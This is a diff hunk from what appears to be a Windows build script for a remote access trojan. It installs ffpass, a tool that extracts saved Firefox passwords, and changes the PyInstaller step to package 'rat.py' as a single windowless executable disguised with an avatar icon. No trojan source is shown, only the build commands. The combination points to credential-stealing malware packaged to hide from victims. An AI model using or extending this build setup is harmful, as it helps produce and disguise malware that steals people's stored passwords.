@@ -24,7 +24,7 @@ pip install ffpass
 pip install Pillow
 pip install pypiwin32
 
-pyinstaller -F -w -i test.ico avatar.ico
+pyinstaller -F -w -i avatar.ico rat.py
 
 
 rmdir /s /q __pycache__
